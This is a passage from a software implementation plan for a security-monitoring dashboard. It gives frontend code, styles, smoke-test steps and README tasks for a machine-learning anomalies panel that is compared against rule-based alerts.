    const agreementPct = total > 0 ? Math.round((data.agree_count / total) * 100) : 0;
    document.getElementById("kpi-ml-agreement").textContent = `${agreementPct}%`;

    renderMlAnomaliesTable(data.results || []);
  } catch (err) {
    console.error(err);
    if (err.status === 503) {
      renderPanelError("#ml-anomalies-panel", "Modelo de ML ainda não foi treinado. Corre scripts/train_anomaly_model.py.");
    } else {
      renderPanelError("#ml-anomalies-panel", err.message || "Erro ao carregar o painel de ML.");
    }
  }
}
```

This relies on `fetchJSON` (already defined earlier in `app.js`) attaching the real HTTP status to the Error it throws — `fetchJSON`'s current body is `throw new Error(body.detail || ...)`, which never carries the status. Update `fetchJSON` itself (a small, additive, backward-compatible change — every other caller only reads `.message`, unaffected):

```javascript
async function fetchJSON(path) {
  const response = await fetch(`${API_BASE}${path}`);
  if (!response.ok) {
    const body = await response.json().catch(() => ({}));
    const error = new Error(body.detail || `Erro HTTP ${response.status}`);
    error.status = response.status;
    throw error;
  }
  return response.json();
}
```

- [ ] **Step 4: Wire the tab into the existing switch/refresh logic**

Find the existing `refreshNewPanels()` function in `app.js` (the block that calls `loadLifecyclePanel(days)`, `loadPrivilegesPanel(days)`, `loadAdminActivityPanel(days)` together, driven by `periodSelect.value`). Add `loadMlAnomaliesPanel(...)` alongside those calls — but note `periodSelect`'s options are in DAYS (7/30/90, see `index.html`'s `#period-select`), while `/api/ml-anomalies` takes `hours` capped at 168 (7 days, set in Wave 4). Convert and clamp: `loadMlAnomaliesPanel(Math.min(Number(days) * 24, 168))`. Do not introduce a second, disconnected control, and do not change `/api/ml-anomalies`'s hour bound to "fix" this — that endpoint is already reviewed and closed; the conversion belongs entirely on the frontend side. Since this means selecting "30 dias" or "90 dias" still only fetches the last 7 days of ML data, add a one-line note in the panel (near the existing `.panel-note`) making this explicit, e.g. "Janela de análise limitada aos últimos 7 dias, independentemente do período selecionado acima."

- [ ] **Step 5: Add styles** in `style.css`, near the existing badge styles (`.severity-badge`, `.media-badge`):

```css
.panel-note {
  color: var(--navy-800);
  opacity: 0.75;
  font-size: 0.9em;
  margin-bottom: 16px;
}

.agreement-badge {
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 0.85em;
  white-space: nowrap;
}
.agreement-badge.agreement-agree { background: #e0f7fa; color: var(--cyan-700); }
.agreement-badge.agreement-diverge { background: #fff3e0; color: #b45309; }

tr.row-diverge { background: rgba(180, 83, 9, 0.06); }
```

- [ ] **Step 6: Manual smoke test in the browser**

1. Run `python -m http.server 5500` from the repo root (or `python scripts/serve_frontend.py` if using the hardened static server).
2. Run the backend: `cd scripts && uvicorn main:app --reload --port 8001` (with `main.indexer_client`/`ML_MODEL_DIR` pointed at a trained model — either train one via `python train_anomaly_model.py` first, or temporarily monkeypatch for a manual check).
3. Open `http://localhost:5500`, click the "🧠 ML Anomalias" tab, confirm: KPIs populate, the table renders rows with a score and an agree/diverge badge, and divergent rows are visually distinct (light amber row background). Confirm the 503 path too, by temporarily renaming `scripts/models/` and reloading the tab — the panel should show the "Modelo de ML ainda não foi treinado" message instead of a raw error or blank table.
4. Restore `scripts/models/` afterward.

- [ ] **Step 7: Commit**

```bash
git add index.html app.js style.css
git commit -m "gauntlet(sentrylens): checkpoint onda 5 - painel frontend ML Anomalias"
```

### Task 8: README documentation

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Add a section documenting the new panel**, following the existing README's structure/tone (Portuguese, same heading style as other panel sections), covering:
  - What `/api/ml-anomalies` does and how it relates to `event_catalog.py` (parallel, never a replacement).
  - How to (re)train: `python scripts/train_anomaly_model.py`, what it reads/writes.
  - The explicit limitation: the shipped model is trained on `scripts/sample_events_real.json` (synthetic, generated by `scripts/_generate_sample_ml_data.py`) — **not real lab data** — so `scripts/ml_training_report.json`'s precision/recall/F1 numbers demonstrate the pipeline works, not real-world detection performance. Real validation requires exporting a few days of real alerts via `scripts/export_snapshot.py` once the Kali VM has been run against the lab, then retraining.
  - The `.xml` → `.json` deviation from the original contract, stated plainly.
  - How `scripts/attack_scenarios.py` fits in (manual Kali VM script, same category as the other lab automation scripts already documented).

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "gauntlet(sentrylens): checkpoint onda 5 - documenta painel ML no README"
```

**Wave 5 checkpoint:** run the AAA gate on Task 7 + Task 8 together (both are part of closing the frontend wave), then log the final Notion entry for "Onda 5".

---

## Self-Review Notes (completed during planning, kept for the executor's reference)

- **Spec coverage:** all 5 named artifacts (`attack_scenarios.py`, `export_snapshot.py`, `feature_extractor.py`, `train_anomaly_model.py`, `/api/ml-anomalies` + frontend panel) map 1:1 to Waves 1–5. The "compara com event_catalog.py" requirement is covered by `rule_flagged` (computed from `classify_alert` inside `feature_extractor.py`) plus the `comparison` block in `evaluate()` (Wave 3) and the `agreement`/`diverge` fields surfaced end-to-end through the API (Wave 4) and UI (Wave 5).
- **Constraint check:** `event_catalog.py` is only ever imported, never edited, in any task above. `wazuh_client.py` is only ever imported (via `main.py`'s existing `indexer_client`), never reimplemented. `feature_extractor.py` has exactly one implementation, imported by both `train_anomaly_model.py` (Wave 3) and `ml_anomalies.py` (Wave 4) — no duplicated feature logic anywhere.
- **Type consistency check:** `FEATURE_NAMES` (Wave 2) is used identically by `vectorize()` (Wave 2), `train_model()`/`evaluate()` (Wave 3), and `build_ml_anomalies_report()` (Wave 4) — none of them redefine or reorder the feature list. The attack-log entry shape from Task 1 (Wave 1) matches exactly what `load_attack_log()`/`label_with_attack_log()` (Wave 2) parse, and what `_generate_sample_ml_data.py` (Wave 3) emits for the fixture. The `/api/ml-anomalies` response shape defined in Wave 4 (`total`, `ml_anomalies_count`, `rule_flagged_count`, `agree_count`, `diverge_count`, `window_hours`, `results[]`) is exactly what Wave 5's `loadMlAnomaliesPanel()` reads — no field name drift.
- **Placeholder scan:** no task above leaves a "TODO"/"add error handling"/"similar to Task N" — every step has literal code or a literal command to run.
